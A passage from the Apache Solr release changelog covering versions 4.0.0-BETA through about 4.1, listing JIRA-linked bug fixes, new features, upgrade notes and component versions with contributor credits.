      the leader.

      (Mark Miller)
  63. [SOLR-4245](http://issues.apache.org/jira/browse/SOLR-4245): When a core is registering with ZooKeeper, the timeout to find the
      leader in the cluster state is 30 seconds rather than leaderVoteWait + extra
      time.

      (Mark Miller)
  64. [SOLR-4238](http://issues.apache.org/jira/browse/SOLR-4238): Fix jetty example requestLog config

      (jm via hossman)
  65. [SOLR-4251](http://issues.apache.org/jira/browse/SOLR-4251): Fix SynonymFilterFactory when an optional tokenizerFactory is supplied.

      (Chris Bleakley via rmuir)
  66. [SOLR-4253](http://issues.apache.org/jira/browse/SOLR-4253): Misleading resource loading warning from Carrot2 clustering
      component fixed

      (StanisÅaw OsiÅski)
  67. [SOLR-4257](http://issues.apache.org/jira/browse/SOLR-4257): PeerSync updates and Log Replay updates should not wait for
      a ZooKeeper connection in order to proceed.

      (yonik)
  68. [SOLR-4045](http://issues.apache.org/jira/browse/SOLR-4045): SOLR admin page returns HTTP 404 on core names containing
      a '.' (dot)

      (steffkes)
  69. [SOLR-4176](http://issues.apache.org/jira/browse/SOLR-4176): analysis ui: javascript not properly handling URL decoding
      of input

      (steffkes)
  70. [SOLR-4079](http://issues.apache.org/jira/browse/SOLR-4079): Long core names break web gui appearance and functionality

      (steffkes)
  71. [SOLR-4263](http://issues.apache.org/jira/browse/SOLR-4263): Incorrect Link from Schema-Browser to Query From for Top-Terms

      (steffkes)
  72. [SOLR-3829](http://issues.apache.org/jira/browse/SOLR-3829): Admin UI Logging events broken if schema.xml defines a catch-all
      dynamicField with type ignored

      (steffkes)
  73. [SOLR-4275](http://issues.apache.org/jira/browse/SOLR-4275): Fix TrieTokenizer to no longer throw StringIndexOutOfBoundsException
      in admin UI / AnalysisRequestHandler when you enter no number to tokenize.

      (Uwe Schindler)
  74. [SOLR-4279](http://issues.apache.org/jira/browse/SOLR-4279): Wrong exception message if \_version\_ field is multivalued

      (shalin)
  75. [SOLR-4170](http://issues.apache.org/jira/browse/SOLR-4170): The 'backup' ReplicationHandler command can sometimes use a stale
      index directory rather than the current one.

      (Mark Miller, Marcin Rzewucki)
  76. [SOLR-3876](http://issues.apache.org/jira/browse/SOLR-3876): Solr Admin UI is completely dysfunctional on IE 9

      (steffkes)
  77. [SOLR-4112](http://issues.apache.org/jira/browse/SOLR-4112): Fixed DataImportHandler ZKAwarePropertiesWriter implementation so
      import works fine with SolrCloud clusters

      (Deniz Durmus, James Dyer,
      Erick Erickson, shalin)
  78. [SOLR-4291](http://issues.apache.org/jira/browse/SOLR-4291): Harden the Overseer work queue thread loop.

      (Mark Miller)
  79. [SOLR-3820](http://issues.apache.org/jira/browse/SOLR-3820): Solr Admin Query form is missing some edismax request parameters

      (steffkes)
  80. [SOLR-4217](http://issues.apache.org/jira/browse/SOLR-4217): post.jar no longer ignores -Dparams when -Durl is used.

      (Alexandre Rafalovitch, ehatcher)
  81. [SOLR-4303](http://issues.apache.org/jira/browse/SOLR-4303): On replication, if the generation of the master is lower than the
      slave we need to force a full copy of the index.

      (Mark Miller, Gregg Donovan)
  82. [SOLR-4266](http://issues.apache.org/jira/browse/SOLR-4266): HttpSolrServer does not release connection properly on exception
      when no response parser is used.

      (Steve Molloy via Mark Miller)
  83. [SOLR-2298](http://issues.apache.org/jira/browse/SOLR-2298): Updated JavaDoc for SolrDocument.addField and SolrInputDocument.addField
      to have more information on name and value parameters.

      (Siva Natarajan)
+ Other Changes   (29)
  1. [SOLR-4106](http://issues.apache.org/jira/browse/SOLR-4106): Javac/ ivy path warnings with morfologik fixed by
     upgrading to Morfologik 1.5.5

     (Robert Muir, Dawid Weiss)
  2. [SOLR-3899](http://issues.apache.org/jira/browse/SOLR-3899): SolrCore should not log at warning level when the index directory
     changes - it's an info event.

     (Tobias Bergman, Mark Miller)
  3. [SOLR-3861](http://issues.apache.org/jira/browse/SOLR-3861): Refactor SolrCoreState so that it's managed by SolrCore.

     (Mark Miller, hossman)
  4. [SOLR-3966](http://issues.apache.org/jira/browse/SOLR-3966): Eliminate superfluous warning from LanguageIdentifierUpdateProcessor

     (Markus Jelsma via hossman)
  5. [SOLR-3932](http://issues.apache.org/jira/browse/SOLR-3932): SolrCmdDistributorTest either takes 3 seconds or 3 minutes.

     (yonik, Mark Miller)
  6. [SOLR-3856](http://issues.apache.org/jira/browse/SOLR-3856): New tests for SqlEntityProcessor/CachedSqlEntityProcessor

     (James Dyer)
  7. [SOLR-4067](http://issues.apache.org/jira/browse/SOLR-4067): ZkStateReader#getLeaderProps should not return props for a leader
     that it does not think is live.

     (Mark Miller)
  8. [SOLR-4086](http://issues.apache.org/jira/browse/SOLR-4086): DIH refactor of VariableResolver and Evaluator. VariableResolver
     and each built-in Evaluator are separate concrete classes. DateFormatEvaluator
     now defaults with the ROOT Locale. However, users may specify a different
     Locale using an optional new third parameter.

     (James Dyer)
  9. [SOLR-3602](http://issues.apache.org/jira/browse/SOLR-3602): Update ZooKeeper to 3.4.5

     (Mark Miller)
  10. [SOLR-4095](http://issues.apache.org/jira/browse/SOLR-4095): DIH NumberFormatTransformer & DateFormatTransformer default to the
      ROOT Locale if none is specified. These previously used the machine's default.

      (James Dyer)
  11. [SOLR-4096](http://issues.apache.org/jira/browse/SOLR-4096): DIH FileDataSource & FieldReaderDataSource default to UTF-8 encoding
      if none is specified. These previously used the machine's default.

      (James Dyer)
  12. [SOLR-1916](http://issues.apache.org/jira/browse/SOLR-1916): DIH to not use Lucene-forbidden Java APIs
      (default encoding, locale, etc.)

      (James Dyer, Robert Muir)
  13. [SOLR-4111](http://issues.apache.org/jira/browse/SOLR-4111): SpellCheckCollatorTest#testContextSensitiveCollate to test against
      both DirectSolrSpellChecker & IndexBasedSpellChecker

      (TomÃ¡s FernÃ¡ndez LÃ¶bbe via James Dyer)
  14. [SOLR-2141](http://issues.apache.org/jira/browse/SOLR-2141): Better test coverage for Evaluators

      (James Dyer)
  15. [SOLR-4119](http://issues.apache.org/jira/browse/SOLR-4119): Update Guava to 13.0.1

      (Mark Miller)
  16. [SOLR-4074](http://issues.apache.org/jira/browse/SOLR-4074): Raise default ramBufferSizeMB to 100 from 32.

      (yonik, Mark Miller)
  17. [SOLR-4062](http://issues.apache.org/jira/browse/SOLR-4062): The update log location in solrconfig.xml should default to
      ${solr.ulog.dir} rather than ${solr.data.dir:}

      (Mark Miller)
  18. [SOLR-4155](http://issues.apache.org/jira/browse/SOLR-4155): Upgrade Jetty to 8.1.8.

      (Robert Muir)
  19. [SOLR-2986](http://issues.apache.org/jira/browse/SOLR-2986): Add MoreLikeThis to warning about features that require uniqueKey.
      Also, change the warning to warn log level.

      (Shawn Heisey via Mark Miller)
  20. [SOLR-4163](http://issues.apache.org/jira/browse/SOLR-4163): README improvements

      (Shawn Heisey via hossman)
  21. [SOLR-4248](http://issues.apache.org/jira/browse/SOLR-4248): "ant eclipse" should declare .svn directories as derived.

      (Shawn Heisey via Mark Miller)
  22. [SOLR-3279](http://issues.apache.org/jira/browse/SOLR-3279): Upgrade Carrot2 to 3.6.2

      (StanisÅaw OsiÅski)
  23. [SOLR-4254](http://issues.apache.org/jira/browse/SOLR-4254): Harden the 'leader requests replica to recover' code path.

      (Mark Miller, yonik)
  24. [SOLR-4226](http://issues.apache.org/jira/browse/SOLR-4226): Extract fl parsing code out of ReturnFields constructor.

      (Ryan Ernst via Robert Muir)
  25. [SOLR-4208](http://issues.apache.org/jira/browse/SOLR-4208): ExtendedDismaxQParserPlugin has been refactored to make
      subclassing easier.

      (TomÃ¡s FernÃ¡ndez LÃ¶bbe, hossman)
  26. [SOLR-3735](http://issues.apache.org/jira/browse/SOLR-3735): Relocate the example mime-to-extension mapping, and
      upgrade Velocity Engine to 1.7

      (ehatcher)
  27. [SOLR-4287](http://issues.apache.org/jira/browse/SOLR-4287): Removed "apache-" prefix from Solr distribution and artifact
      filenames.

      (Ryan Ernst, Robert Muir, Steve Rowe)
  28. [SOLR-4016](http://issues.apache.org/jira/browse/SOLR-4016): Deduplication does not work with atomic/partial updates so
      disallow atomic update requests which change signature generating fields.

      (Joel Nothman, yonik, shalin)
  29. [SOLR-4308](http://issues.apache.org/jira/browse/SOLR-4308): Remove the problematic and now unnecessary log4j-over-slf4j.

      (Mark Miller)

### Release 4.0.0 [2012-10-12]

+ Versions of Major Components   (5)
  1. Apache Tika 1.2
  2. Carrot2 3.5.0
  3. Velocity 1.6.4 and Velocity Tools 2.0
  4. Apache UIMA 2.3.1
  5. Apache ZooKeeper 3.3.6
+ Upgrading from Solr 4.0.0-BETA   (2)
  1. In order to better support distributed search mode, the TermVectorComponent's
     response format has been changed so that if the schema defines a
     uniqueKeyField, then that field value is used as the "key" for each document in
     it's response section, instead of the internal lucene doc id. Users w/o a
     uniqueKeyField will continue to see the same response format. See [SOLR-3229](http://issues.apache.org/jira/browse/SOLR-3229)
     for more details.
  2. If you are using SolrCloud's distributed update request capabilities and a non
     string type id field, you must re-index.
+ Upgrading from Solr 4.0.0-ALPHA   (2)
  1. Solr is now much more strict about requiring that the uniqueKeyField feature
     (if used) must refer to a field which is not multiValued. If you upgrade from
     an earlier version of Solr and see an error that your uniqueKeyField "can not
     be configured to be multivalued" please add 'multiValued="false"' to the
     <field /> declaration for your uniqueKeyField. See [SOLR-3682](http://issues.apache.org/jira/browse/SOLR-3682) for more details.
  2. In addition, please review the notes above about upgrading from 4.0.0-BETA
+ Upgrading from Solr 3.6   (10)
  1. The Lucene index format has changed and as a result, once you upgrade,
     previous versions of Solr will no longer be able to read your indices.
     In a master/slave configuration, all searchers/slaves should be upgraded
     before the master. If the master were to be updated first, the older
     searchers would not be able to read the new index format.
  2. Setting abortOnConfigurationError=false is no longer supported
     (since it has never worked properly). Solr will now warn you if
     you attempt to set this configuration option at all. (see [SOLR-1846](http://issues.apache.org/jira/browse/SOLR-1846))
  3. The default logic for the 'mm' param of the 'dismax' QParser has
     been changed. If no 'mm' param is specified (either in the query,
     or as a default in solrconfig.xml) then the effective value of the
     'q.op' param (either in the query or as a default in solrconfig.xml
     or from the 'defaultOperator' option in schema.xml) is used to
     influence the behavior. If q.op is effectively "AND" then mm=100%.
     If q.op is effectively "OR" then mm=0%. Users who wish to force the
     legacy behavior should set a default value for the 'mm' param in
     their solrconfig.xml file.
  4. The VelocityResponseWriter is no longer built into the core. Its JAR and
     dependencies now need to be added (via <lib> or solr/home lib inclusion),
     and it needs to be registered in solrconfig.xml like this:
     <queryResponseWriter name="velocity" class="solr.VelocityResponseWriter"/>
  5. The update request parameter to choose Update Request Processor Chain is
     renamed from "update.processor" to "update.chain". The old parameter was
     deprecated but still working since Solr3.2, but is now removed
     entirely.
  6. The <indexDefaults> and <mainIndex> sections of solrconfig.xml are discontinued
     and replaced with the <indexConfig> section. There are also better defaults.
     When migrating, if you don't know what your old settings mean, simply delete
     both <indexDefaults> and <mainIndex> sections. If you have customizations,
     put them in <indexConfig> section - with same syntax as before.
  7. Two of the SolrServer subclasses in SolrJ were renamed/replaced.
     CommonsHttpSolrServer is now HttpSolrServer, and
     StreamingUpdateSolrServer is now ConcurrentUpdateSolrServer.
  8. The PingRequestHandler no longer looks for a <healthcheck/> option in the
     (legacy) <admin> section of solrconfig.xml. Users who wish to take
     advantage of this feature should configure a "healthcheckFile" init param
     directly on the PingRequestHandler. As part of this change, relative file
     paths have been fixed to be resolved against the data dir. See the example
     solrconfig.xml and [SOLR-1258](http://issues.apache.org/jira/browse/SOLR-1258) for more details.
  9. Due to low level changes to support SolrCloud, the uniqueKey field can no
     longer be populated via <copyField/> or <field default=...> in the
     schema.xml. Users wishing to have Solr automatically generate a uniqueKey
     value when adding documents should instead use an instance of
     solr.UUIDUpdateProcessorFactory in their update processor chain. See
     [SOLR-2796](http://issues.apache.org/jira/browse/SOLR-2796) for more details.
  10. In addition, please review the notes above about upgrading from 4.0.0-BETA, and 4.0.0-ALPHA
#### Detailed Change List

+ New Features   (8)
  1. [SOLR-3670](http://issues.apache.org/jira/browse/SOLR-3670): New CountFieldValuesUpdateProcessorFactory makes it easy to index
     the number of values in another field for later use at query time.

     (hossman)
  2. [SOLR-2768](http://issues.apache.org/jira/browse/SOLR-2768): new "mod(x,y)" function for computing the modulus of two value
     sources.

     (hossman)
  3. [SOLR-3238](http://issues.apache.org/jira/browse/SOLR-3238): Numerous small improvements to the Admin UI

     (steffkes)
  4. [SOLR-3597](http://issues.apache.org/jira/browse/SOLR-3597): seems like a lot of wasted whitespace at the top of the admin screens

     (steffkes)
  5. [SOLR-3304](http://issues.apache.org/jira/browse/SOLR-3304): Added Solr adapters for Lucene 4's new spatial module. With
     SpatialRecursivePrefixTreeFieldType ("location\_rpt" in example schema), it is
     possible to index a variable number of points per document (and sort on them),
     index not just points but any Spatial4j supported shape such as polygons, and
     to query on these shapes too. Polygons requires adding JTS to the classpath.

     (David Smiley)
  6. [SOLR-3825](http://issues.apache.org/jira/browse/SOLR-3825): Added optional capability to log what ids are in a response

     (Scott Stults via gsingers)
  7. [SOLR-3821](http://issues.apache.org/jira/browse/SOLR-3821): Added 'df' to the UI Query form

     (steffkes)
  8. [SOLR-3822](http://issues.apache.org/jira/browse/SOLR-3822): Added hover titles to the edismax params on the UI Query form

     (steffkes)
+ Optimizations   (4)
  1. [SOLR-3715](http://issues.apache.org/jira/browse/SOLR-3715): improve concurrency of the transaction log by removing
     synchronization around log record serialization.

     (yonik)
  2. [SOLR-3807](http://issues.apache.org/jira/browse/SOLR-3807): Currently during recovery we pause for a number of seconds after
     waiting for the leader to see a recovering state so that any previous updates
     will have finished before our commit on the leader - we don't need this wait
     for peersync.

     (Mark Miller)
  3. [SOLR-3837](http://issues.apache.org/jira/browse/SOLR-3837): When a leader is elected and asks replicas to sync back to him and
     that fails, we should ask those nodes to recovery asynchronously rather than
     synchronously.

     (Mark Miller)
  4. [SOLR-3709](http://issues.apache.org/jira/browse/SOLR-3709): Cache the url list created from the ClusterState in CloudSolrServer
     on each request.

     (Mark Miller)
+ Bug Fixes   (58)
  1. [SOLR-3685](http://issues.apache.org/jira/browse/SOLR-3685): Solr Cloud sometimes skipped peersync attempt and replicated instead due
     to tlog flags not being cleared when no updates were buffered during a previous
     replication.

     (Markus Jelsma, Mark Miller, yonik)
  2. [SOLR-3229](http://issues.apache.org/jira/browse/SOLR-3229): Fixed TermVectorComponent to work with distributed search

     (Hang Xie, hossman)
  3. [SOLR-3725](http://issues.apache.org/jira/browse/SOLR-3725): Fixed package-local-src-tgz target to not bring in unnecessary jars
     and binary contents.

     (Michael Dodsworth via rmuir)
  4. [SOLR-3649](http://issues.apache.org/jira/browse/SOLR-3649): Fixed bug in JavabinLoader that caused deleteById(List<String> ids)
     to not work in SolrJ

     (siren)
  5. [SOLR-3730](http://issues.apache.org/jira/browse/SOLR-3730): Rollback is not implemented quite right and can cause corner case fails in
     SolrCloud tests.

     (rmuir, Mark Miller)
  6. [SOLR-2981](http://issues.apache.org/jira/browse/SOLR-2981): Fixed StatsComponent to no longer return duplicated information
     when requesting multiple stats.facet fields.

     (Roman Kliewer via hossman)
  7. [SOLR-3743](http://issues.apache.org/jira/browse/SOLR-3743): Fixed issues with atomic updates and optimistic concurrency in
     conjunction with stored copyField targets by making real-time get never
     return copyField targets.

     (yonik)
  8. [SOLR-3746](http://issues.apache.org/jira/browse/SOLR-3746): Proper error reporting if updateLog is configured w/o necessary
     "\_version\_" field in schema.xml

     (hossman)
  9. [SOLR-3745](http://issues.apache.org/jira/browse/SOLR-3745): Proper error reporting if SolrCloud mode is used w/o
     necessary "\_version\_" field in schema.xml

     (hossman)
  10. [SOLR-3770](http://issues.apache.org/jira/browse/SOLR-3770): Overseer may lose updates to cluster state

      (siren)
  11. [SOLR-3721](http://issues.apache.org/jira/browse/SOLR-3721): Fix bug that could theoretically allow multiple recoveries to run
      briefly at the same time if the recovery thread join call was interrupted.

      (Per Steffensen, Mark Miller)
  12. [SOLR-3782](http://issues.apache.org/jira/browse/SOLR-3782): A leader going down while updates are coming in can cause shard
      inconsistency.

      (Mark Miller)
  13. [SOLR-3611](http://issues.apache.org/jira/browse/SOLR-3611): We do not show ZooKeeper data in the UI for a node that has children.

      (Mark Miller)
  14. [SOLR-3789](http://issues.apache.org/jira/browse/SOLR-3789): Fix bug in SnapPuller that caused "internal" compression to fail.

      (siren)
  15. [SOLR-3790](http://issues.apache.org/jira/browse/SOLR-3790): ConcurrentModificationException could be thrown when using hl.fl=\*.
      Fixed in r1231606.

      (yonik, koji)
  16. [SOLR-3668](http://issues.apache.org/jira/browse/SOLR-3668): DataImport : Specifying Custom Parameters

      (steffkes)
  17. [SOLR-3793](http://issues.apache.org/jira/browse/SOLR-3793): UnInvertedField faceting cached big terms in the filter
      cache that ignored deletions, leading to duplicate documents in search
      later when a filter of the same term was specified.

      (GÃ¼nter Hipler, hossman, yonik)
  18. [SOLR-3679](http://issues.apache.org/jira/browse/SOLR-3679): Core Admin UI gives no feedback if "Add Core" fails

      (steffkes, hossman)
  19. [SOLR-3795](http://issues.apache.org/jira/browse/SOLR-3795): Fixed LukeRequestHandler response to correctly return field name
      strings in copyDests and copySources arrays

      (hossman)
  20. [SOLR-3699](http://issues.apache.org/jira/browse/SOLR-3699): Fixed some Directory leaks when there were errors during SolrCore
      or SolrIndexWriter initialization.

      (hossman)
  21. [SOLR-3518](http://issues.apache.org/jira/browse/SOLR-3518): Include final 'hits' in log information when aggregating a
      distributed request

      (Markus Jelsma via hossman)
  22. [SOLR-3628](http://issues.apache.org/jira/browse/SOLR-3628): SolrInputField and SolrInputDocument are now consistently backed
      by Collections passed in to setValue/setField, and defensively copy values
      from Collections passed to addValue/addField

      (Tom Switzer via hossman)
  23. [SOLR-3595](http://issues.apache.org/jira/browse/SOLR-3595): CurrencyField now generates an appropriate error on schema init
      if it is configured as multiValued - this has never been properly supported,
      but previously failed silently in odd ways.

      (hossman)
  24. [SOLR-3823](http://issues.apache.org/jira/browse/SOLR-3823): Fix 'bq' parsing in edismax. Please note that this required
      reverting the negative boost support added by [SOLR-3278](http://issues.apache.org/jira/browse/SOLR-3278)

      (hossman)
  25. [SOLR-3827](http://issues.apache.org/jira/browse/SOLR-3827): Fix shareSchema=true in solr.xml

      (TomÃ¡s FernÃ¡ndez LÃ¶bbe via hossman)
  26. [SOLR-3809](http://issues.apache.org/jira/browse/SOLR-3809): Fixed config file replication when subdirectories are used

      (Emmanuel Espina via hossman)
  27. [SOLR-3828](http://issues.apache.org/jira/browse/SOLR-3828): Fixed QueryElevationComponent so that using 'markExcludes' does
      not modify the result set or ranking of 'excluded' documents relative to
      not using elevation at all.

      (Alexey Serba via hossman)
  28. [SOLR-3569](http://issues.apache.org/jira/browse/SOLR-3569): Fixed debug output on distributed requests when there are no
      results found.

      (David Bowen via hossman)
  29. [SOLR-3811](http://issues.apache.org/jira/browse/SOLR-3811): Query Form using wrong values for dismax, edismax

      (steffkes)
  30. [SOLR-3779](http://issues.apache.org/jira/browse/SOLR-3779): DataImportHandler's LineEntityProcessor when used in conjunction
      with FileListEntityProcessor would only process the first file.

      (Ahmet Arslan via James Dyer)
  31. [SOLR-3791](http://issues.apache.org/jira/browse/SOLR-3791): CachedSqlEntityProcessor would throw a NullPointerException when
      a query returns a row with a NULL key.

      (Steffen Moelter via James Dyer)
  32. [SOLR-3833](http://issues.apache.org/jira/browse/SOLR-3833): When a election is started because a leader went down, the new
      leader candidate should decline if the last state they published was not
      active.

      (yonik, Mark Miller)
  33. [SOLR-3836](http://issues.apache.org/jira/browse/SOLR-3836): When doing peer sync, we should only count sync attempts that
      cannot reach the given host as success when the candidate leader is
      syncing with the replicas - not when replicas are syncing to the leader.

      (Mark Miller)
  34. [SOLR-3835](http://issues.apache.org/jira/browse/SOLR-3835): In our leader election algorithm, if on connection loss we found
      we did not create our election node, we should retry, not throw an exception.

      (Mark Miller)
  35. [SOLR-3834](http://issues.apache.org/jira/browse/SOLR-3834): A new leader on cluster startup should also run the leader sync
      process in case there was a bad cluster shutdown.

      (Mark Miller)
  36. [SOLR-3772](http://issues.apache.org/jira/browse/SOLR-3772): On cluster startup, we should wait until we see all registered
      replicas before running the leader process - or if they all do not come up,
      N amount of time.

      (Mark Miller)
  37. [SOLR-3756](http://issues.apache.org/jira/browse/SOLR-3756): If we are elected the leader of a shard, but we fail to publish
      this for any reason, we should clean up and re trigger a leader election.

      (Mark Miller)
  38. [SOLR-3812](http://issues.apache.org/jira/browse/SOLR-3812): ConnectionLoss during recovery can cause lost updates, leading to
      shard inconsistency.

      (Mark Miller)
  39. [SOLR-3813](http://issues.apache.org/jira/browse/SOLR-3813): When a new leader syncs, we need to ask all shards to sync back,
      not just those that are active.

      (Mark Miller)
  40. [SOLR-3641](http://issues.apache.org/jira/browse/SOLR-3641): CoreContainer is not persisting roles core attribute.

      (hossman, Mark Miller)
  41. [SOLR-3527](http://issues.apache.org/jira/browse/SOLR-3527): SolrCmdDistributor drops some of the important commit attributes
      (maxOptimizeSegments, softCommit, expungeDeletes) when sending a commit to
      replicas.

      (Andy Laird, TomÃ¡s FernÃ¡ndez LÃ¶bbe, Mark Miller)
  42. [SOLR-3844](http://issues.apache.org/jira/browse/SOLR-3844): SolrCore reload can fail because it tries to remove the index
      write lock while already holding it.

      (Mark Miller)
  43. [SOLR-3831](http://issues.apache.org/jira/browse/SOLR-3831): Atomic updates do not distribute correctly to other nodes.

      (Jim Musil, Mark Miller)
  44. [SOLR-3465](http://issues.apache.org/jira/browse/SOLR-3465): Replication causes two searcher warmups.

      (Michael Garski, Mark Miller)
  45. [SOLR-3645](http://issues.apache.org/jira/browse/SOLR-3645): /terms should default to distrib=false.

      (Nick Cotton, Mark Miller)
  46. [SOLR-3759](http://issues.apache.org/jira/browse/SOLR-3759): Various fixes to the example-DIH configs

      (Ahmet Arslan, hossman)
  47. [SOLR-3777](http://issues.apache.org/jira/browse/SOLR-3777): Dataimport-UI does not send unchecked checkboxes

      (Glenn MacStravic
      via steffkes)
  48. [SOLR-3850](http://issues.apache.org/jira/browse/SOLR-3850): DataImportHandler "cacheKey" parameter was incorrectly renamed "cachePk"

      (James Dyer)
  49. [SOLR-3087](http://issues.apache.org/jira/browse/SOLR-3087): Fixed DOMUtil so that code doing attribute validation will
      automatically ignore nodes in the reserved "xml" prefix - in particular this
      fixes some bugs related to xinclude and fieldTypes.

      (Amit Nithian, hossman)
  50. [SOLR-3783](http://issues.apache.org/jira/browse/SOLR-3783): Fixed Pivot Faceting to work with facet.missing=true

      (hossman)
  51. [SOLR-3869](http://issues.apache.org/jira/browse/SOLR-3869): A PeerSync attempt to it's replicas by a candidate leader should
      not fail on o.a.http.conn.ConnectTimeoutException.

      (Mark Miller)
  52. [SOLR-3875](http://issues.apache.org/jira/browse/SOLR-3875): Fixed index boosts on multi-valued fields when docBoost is used

      (hossman)
  53. [SOLR-3878](http://issues.apache.org/jira/browse/SOLR-3878): Exception when using open-ended range query with CurrencyField

      (janhoy)
  54. [SOLR-3891](http://issues.apache.org/jira/browse/SOLR-3891): CacheValue in CachingDirectoryFactory cannot be used outside of
      solr.core package.

      (phunt via Mark Miller)
  55. [SOLR-3892](http://issues.apache.org/jira/browse/SOLR-3892): Inconsistent locking when accessing cache in CachingDirectoryFactory
      from RAMDirectoryFactory and MockDirectoryFactory.

      (phunt via Mark Miller)
  56. [SOLR-3883](http://issues.apache.org/jira/browse/SOLR-3883): Distributed indexing forwards non-applicable request params.

      (Dan Sutton, Per Steffensen, yonik, Mark Miller)
  57. [SOLR-3903](http://issues.apache.org/jira/browse/SOLR-3903): Fixed MissingFormatArgumentException in ConcurrentUpdateSolrServer

      (hossman)
  58. [SOLR-3916](http://issues.apache.org/jira/browse/SOLR-3916): Fixed whitespace bug in parsing the fl param

      (hossman)
+ Other Changes   (18)
  1. [SOLR-3690](http://issues.apache.org/jira/browse/SOLR-3690): Fixed binary release packages to include dependencies needed for
     the solr-test-framework

     (hossman)
  2. [SOLR-2857](http://issues.apache.org/jira/browse/SOLR-2857): The /update/json and /update/csv URLs were restored to aid
     in the migration of existing clients.

     (yonik)
  3. [SOLR-3691](http://issues.apache.org/jira/browse/SOLR-3691): SimplePostTool: Mode for crawling/posting web pages
     See <http://wiki.apache.org/solr/ExtractingRequestHandler> for examples

     (janhoy)
  4. [SOLR-3707](http://issues.apache.org/jira/browse/SOLR-3707): Upgrade Solr to Tika 1.2

     (janhoy)
  5. [SOLR-2747](http://issues.apache.org/jira/browse/SOLR-2747): Updated changes2html.pl to handle Solr's CHANGES.txt; added
     target 'changes-to-html' to solr/build.xml.

     (Steve Rowe, Robert Muir)
  6. [SOLR-3752](http://issues.apache.org/jira/browse/SOLR-3752): When a leader goes down, have the Overseer clear the leader state
     in cluster.json

     (Mark Miller)
  7. [SOLR-3751](http://issues.apache.org/jira/browse/SOLR-3751): Add defensive checks for SolrCloud updates and requests that ensure
     the local state matches what we can tell the request expected.

     (Mark Miller)
  8. [SOLR-3773](http://issues.apache.org/jira/browse/SOLR-3773): Hash based on the external String id rather than the indexed
     representation for distributed updates.

     (Michael Garski, yonik, Mark Miller)
  9. [SOLR-3780](http://issues.apache.org/jira/browse/SOLR-3780): Maven build: Make solrj tests run separately from solr-core.

     (Steve Rowe)
  10. [SOLR-3772](http://issues.apache.org/jira/browse/SOLR-3772): Optionally, on cluster startup, we can wait until we see all registered
      replicas before running the leader process - or if they all do not come up,
      N amount of time.

      (Jan HÃ¸ydahl, Per Steffensen, Mark Miller)
  11. [SOLR-3750](http://issues.apache.org/jira/browse/SOLR-3750): Optionally, on session expiration, we can explicitly wait some time before
      running the leader sync process so that we are sure every node participates.

      (Per Steffensen, Mark Miller)
  12. [SOLR-3824](http://issues.apache.org/jira/browse/SOLR-3824): Velocity: Error messages from search not displayed

      (janhoy)
  13. [SOLR-3826](http://issues.apache.org/jira/browse/SOLR-3826): Test framework improvements for specifying coreName on initCore

      (Amit Nithian, hossman)
  14. [SOLR-3749](http://issues.apache.org/jira/browse/SOLR-3749): Allow default UpdateLog syncLevel to be configured by
      solrconfig.xml

      (Raintung Li, Mark Miller)
  15. [SOLR-3845](http://issues.apache.org/jira/browse/SOLR-3845): Rename numReplicas to replicationFactor in Collections API.

      (yonik, Mark Miller)
  16. [SOLR-3815](http://issues.apache.org/jira/browse/SOLR-3815): SolrCloud - Add properties such as "range" to shards, which changes
      the clusterstate.json and puts the shard replicas under "replicas".

      (yonik)
  17. [SOLR-3871](http://issues.apache.org/jira/browse/SOLR-3871): SyncStrategy should use an executor for the threads it creates to
      request recoveries.

      (Mark Miller)
  18. [SOLR-3870](http://issues.apache.org/jira/browse/SOLR-3870): SyncStrategy should have a close so it can abort earlier on
      shutdown.

      (Mark Miller)

### Release 4.0.0-BETA [2012-08-13]

+ Versions of Major Components   (5)
  1. Apache Tika 1.1
  2. Carrot2 3.5.0
  3. Velocity 1.6.4 and Velocity Tools 2.0
  4. Apache UIMA 2.3.1
  5. Apache ZooKeeper 3.3.6
+ Upgrading from Solr 4.0.0-ALPHA   (1)
  1. Solr is now much more strict about requiring that the uniqueKeyField feature
     (if used) must refer to a field which is not multiValued. If you upgrade from
     an earlier version of Solr and see an error that your uniqueKeyField "can not
     be configured to be multivalued" please add 'multiValued="false"' to the
     <field /> declaration for your uniqueKeyField. See [SOLR-3682](http://issues.apache.org/jira/browse/SOLR-3682) for more details.
#### Detailed Change List

+ New Features   (15)
  1. [LUCENE-4201](http://issues.apache.org/jira/browse/LUCENE-4201): Added JapaneseIterationMarkCharFilterFactory to normalize Japanese
     iteration marks.

     (Robert Muir, Christian Moen)
  2. [SOLR-1856](http://issues.apache.org/jira/browse/SOLR-1856): In Solr Cell, literals should override Tika-parsed values.
     Patch adds a param "literalsOverride" which defaults to true, but can be set
     to "false" to let Tika-parsed values be appended to literal values

     (Chris Harris, janhoy)
  3. [SOLR-3488](http://issues.apache.org/jira/browse/SOLR-3488): Added a Collection management API for SolrCloud.

     (Tommaso Teofili, Sami Siren, yonik, Mark Miller)
  4. [SOLR-3559](http://issues.apache.org/jira/browse/SOLR-3559): Full deleteByQuery support with SolrCloud distributed indexing.
     All replicas of a shard will be consistent, even if updates arrive in a
     different order on different replicas.

     (yonik)
  5. [SOLR-1929](http://issues.apache.org/jira/browse/SOLR-1929): Index encrypted documents with ExtractingUpdateRequestHandler.
     By supplying resource.password=<mypw> or specifying an external file with regular
     expressions matching file names, Solr will decrypt and index PDFs and DOCX formats.

     (janhoy, Yiannis Pericleous)
  6. [SOLR-3562](http://issues.apache.org/jira/browse/SOLR-3562): Add options to remove instance dir or data dir on core unload.

     (Mark Miller, Per Steffensen)
  7. [SOLR-2702](http://issues.apache.org/jira/browse/SOLR-2702): The default directory factory was changed to NRTCachingDirectoryFactory
     which wraps the StandardDirectoryFactory and caches small files for improved
     Near Real-time (NRT) performance.

     (Mark Miller, yonik)
  8. [SOLR-2616](http://issues.apache.org/jira/browse/SOLR-2616): Include a sample java util logging configuration file.

     (David Smiley, Mark Miller)
  9. [SOLR-3460](http://issues.apache.org/jira/browse/SOLR-3460): Add cloud-scripts directory and a zkcli.sh|bat tool for easy scripting
     and interaction with ZooKeeper.

     (Mark Miller)
  10. [SOLR-1725](http://issues.apache.org/jira/browse/SOLR-1725): StatelessScriptUpdateProcessorFactory allows users to implement
      the full ScriptUpdateProcessor API using any scripting language with a
      javax.script.ScriptEngineFactory

      (Uri Boness, ehatcher, Simon Rosenthal, hossman)
  11. [SOLR-139](http://issues.apache.org/jira/browse/SOLR-139): Change to updateable documents to create the document if it doesn't
      already exist. To assert that the document must exist, use the optimistic
      concurrency feature by specifying a \_version\_ of 1.

      (yonik)
